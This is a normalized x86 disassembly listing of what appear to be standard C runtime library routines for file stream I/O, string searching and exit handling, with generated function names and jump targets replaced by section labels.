mov ecx [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x4 ] ecx
test ecx ecx
jg r-xdata
mov eax ebx
test ecx ecx
je r-xdata
push esi
call sub_41966b
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
test ebx ebx
jne r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ebx
xor edx edx
div ecx
mov eax ebx
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ esi ]
call sub_41a1a0
mov eax [ ebp - 0x8 ]
sub [ esi + 0x4 ] eax
add [ esi ] eax
add esp 0xc
sub ebx eax
add [ ebp + 0x8 ] eax
jmp r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x8 ]
push esi
call sub_42094c
pop ecx
push eax
call sub_421207
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] edx
sub ebx edx
cmp eax ecx
jb r-xdata
mov edx eax
sub_417f55
push 0xc
push r--data
call sub_41ecb0
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov esi [ ebp + 0x14 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417dfe
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fcb
mov eax edi
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
call sub_41ecf5
retn
sub_417fd3
push ebp
mov ebp esp
mov eax 0x1020
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x1020 ] ebx
test ebx ebx
jne r-xdata
push esi
push ebx
call sub_42094c
mov esi eax
xor eax eax
pop ecx
mov [ ebp - 0x1018 ] esi
cmp [ ebx + 0x4 ] eax
jge r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
push esi
call sub_421b13
mov ecx eax
add esp 0xc
mov [ ebp - 0x1008 ] ecx
test ecx ecx
jns r-xdata
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov edx esi
sar edx 0x5
mov [ ebp - 0x1010 ] edx
mov edx [ edx * 4 + rw-data ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov [ ebp - 0x101c ] eax
mov dl [ eax + edx + 0x24 ]
add dl dl
sar dl 0x1
test [ ebx + 0xc ] 0x108
mov [ ebp - 0x1009 ] dl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebx ]
push edi
mov edi esi
sub edi [ ebx + 0x8 ]
test [ ebx + 0xc ] 0x3
mov [ ebp - 0x1014 ] edi
je r-xdata
sub ecx [ ebx + 0x4 ]
mov eax ecx
jmp r-xdata
pop esi
test [ ebx + 0xc ] 0x80
jne r-xdata
cmp dl 0x1
jne r-xdata
test ecx ecx
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
cmp [ eax + ecx + 0x30 ] 0x0
mov ecx [ ebp - 0x1008 ]
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax edi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x1014 ] ecx
cmp ecx esi
mov ecx [ ebp - 0x1008 ]
jae r-xdata
shr edi 0x1
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop edi
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
mov ebx [ ebp - 0x1018 ]
mov ecx [ edx * 4 + rw-data ]
push 0x0
push [ eax + ecx + 0x2c ]
push [ eax + ecx + 0x28 ]
push ebx
call sub_421c67
mov ecx [ ebp - 0x101c ]
mov esi eax
mov eax [ ebp - 0x1010 ]
add esp 0x10
mov eax [ eax * 4 + rw-data ]
cmp esi [ ecx + eax + 0x28 ]
jne r-xdata
mov eax ecx
jmp r-xdata
lea eax [ edi + ecx ]
shr edi 0x1
sub esi [ ebx + 0x8 ]
add esi [ ebx + 0x4 ]
mov ebx [ ebp - 0x1010 ]
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1020 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
xor edi edi
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
inc edi
cmp edx [ ecx + eax + 0x2c ]
jne r-xdata
sub ecx esi
push 0x2
push 0x0
push [ ebp - 0x1018 ]
call sub_421b13
mov ecx [ ebp - 0x1008 ]
add esp 0xc
cmp eax ecx
jne r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x101c ]
push 0x0
lea edx [ ebp - 0x1014 ]
push edx
push 0x1000
lea edx [ ebp - 0x1004 ]
push edx
push [ ecx + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
push ecx
push [ ebp - 0x1018 ]
call sub_421b13
add esp 0xc
test eax eax
jns r-xdata
mov eax [ ebx + 0x8 ]
lea edx [ eax + esi ]
jmp r-xdata
push 0x0
push [ ebp - 0x1008 ]
push ebx
call sub_421b13
add esp 0xc
test eax eax
js r-xdata
mov eax 0x200
cmp esi eax
ja r-xdata
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x1014 ]
cmp edi eax
ja r-xdata
mov esi [ ebx + 0x18 ]
test [ ebx + 0xc ] 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ ebx + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
test edi edi
je r-xdata
mov dl [ ebp - 0x1009 ]
cmp dl 0x1
jne r-xdata
inc esi
test [ ebx + 0xc ] 0x400
mov esi eax
je r-xdata
inc eax
inc esi
je r-xdata
lea eax [ ebp - 0x1004 ]
sub esi eax
lea eax [ ecx + esi ]
jmp r-xdata
mov edx ecx
add edx eax
shr esi 0x1
mov eax [ ebp - 0x1010 ]
mov ecx [ ebp - 0x101c ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x4
mov ecx [ ebp - 0x1008 ]
mov al [ ecx ]
cmp al 0xd
jne r-xdata
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edx - 0x1 ]
cmp ecx eax
jae r-xdata
dec edi
cmp ecx edx
jae r-xdata
inc ecx
test edi edi
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_418340
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
and eax 0xffffffef
push edi
mov [ esi + 0xc ] eax
cmp ebx 0x1
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_417fd3
mov edi [ ebp + 0xc ]
add edi eax
pop ecx
xor ebx ebx
jmp r-xdata
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push esi
call sub_41966b
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push ebx
push edi
push esi
call sub_42094c
pop ecx
push eax
call sub_421b13
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop edi
pop ebx
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_4183cf
push 0xc
push r--data
call sub_41ecb0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push edi
push [ ebp + 0xc ]
push esi
call sub_418340
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418446
mov eax edi
cmp edi 0x1
je r-xdata
call sub_41ecf5
retn
cmp edi 0x2
jne r-xdata
sub_41844e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_41966b
push esi
mov edi eax
call sub_422411
push esi
call sub_42094c
push eax
call sub_4222ad
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_417912
and [ esi + 0x1c ] 0x0
pop ecx
sub_4184ba
push 0xc
push r--data
call sub_41ecb0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_41844e
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418529
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_41ecf5
retn
sub_418546
push 0xc
push r--data
call sub_41ecb0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
call sub_419282
add eax 0x20
push eax
push 0x1
call sub_4192c7
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_419282
add eax 0x20
push eax
call sub_422472
pop ecx
mov esi eax
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_419282
add eax 0x20
push eax
call sub_422518
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_419282
add eax 0x20
push eax
push esi
call sub_422441
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4185df
mov eax edi
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
call sub_41ecf5
retn
sub_4185f2
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
call sub_41c7c6
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ esi ] eax
push eax
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call [ AreFileApisANSI@IAT ]
test eax eax
jne r-xdata
add eax eax
push eax
call sub_41b8d1
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_41ccd0
xor ebx ebx
inc ebx
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
push eax
call sub_41ccd0
push [ esi ]
call sub_417912
and [ esi ] 0x0
pop ecx
jmp r-xdata
pop ecx
sub_4186a2
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_418724
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_423311
push r--data
push r--data
call sub_41881d
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_423220
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_4231aa
call sub_4178d3
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_423220
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4187c9
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_41ec6a
push esi
call sub_41f3d9
push esi
call sub_41f294
push esi
call sub_4233c0
push esi
call sub_4233da
push esi
call sub_4233af
add esp 0x18
pop esi
jmp sub_41c804
sub_418801
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_41881d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_418851
push 0x1c
push r--data
call sub_41ecb0
push 0x8
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41896b
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_41ecf5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_41ae9a
pop ecx
push [ ebp + 0x8 ]
call sub_4186d4
push r--data
push r--data
call sub_418801
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_418801
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_4189a0
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_418b0e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_418bd4
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418b4e
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_418b7c
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418b7c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_418c12
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_418bd4
jmp r-xdata
sub_418baf
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_418c12
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_418bd4
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_41a7f0
lea edi [ eax + 0x1 ]
push edi
call sub_41794a
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_423cea
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_418c3b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_41cae0
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_41ccf1
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_41a1a0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_41ccf1
push 0x22
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
pop edi
sub_418cc0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_418d6d
push 0xc
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_419288
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_42094c
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418e5e
mov eax edi
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
push esi
call sub_42082b
pop ecx
mov edi eax
mov eax [ esi ]
movzx edi [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] edi
mov edx rw-data
cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_418e66
push 0xc
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_419288
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_42094c
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418f5f
mov eax edi
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_41f952
pop ecx
pop ecx
mov edi eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
movzx edi cl
inc [ esi ]
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] edi
mov edx rw-data
cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_418f67
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_42094c
pop ecx
mov ecx eax
mov ebx rw-data
cmp ecx edi
je r-xdata
mov eax edi
test [ esi + 0xc ] 0x1
jne r-xdata
mov edx ebx
cmp ecx 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test [ esi + 0xc ] 0x80
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp ecx edi
je r-xdata
mov edx ecx
and edx 0x1f
sar eax 0x5
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_423d3f
pop ecx
test [ esi + 0xc ] 0x2
jne r-xdata
mov ecx ebx
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ ecx + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
movzx eax bl
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_419047
push 0xc
push r--data
call sub_41ecb0
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_418f67
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4190ab
mov eax edi
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
jmp r-xdata
call sub_41ecf5
retn
sub_4190b3
push 0x10
push r--data
call sub_41ecb0
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x20 ] esi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41910b
call sub_41ecf5
retn 0x14
mov ecx edi
call [ ebp + 0x14 ]
add edi ebx
mov [ ebp + 0x8 ] edi
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jge r-xdata
sub_41911b
push 0xc
push r--data
call sub_41ecb0
and [ ebp - 0x1c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax ebx
mov edi [ ebp + 0x10 ]
imul eax edi
mov esi [ ebp + 0x8 ]
add esi eax
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41917a
call sub_41ecf5
retn 0x10
sub esi ebx
mov [ ebp + 0x8 ] esi
mov ecx esi
call [ ebp + 0x14 ]
jmp r-xdata
dec edi
mov [ ebp + 0x10 ] edi
js r-xdata
sub_41918a
push 0x14
push r--data
call sub_41ecb0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ecf5
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_4191e8
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_41b887
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
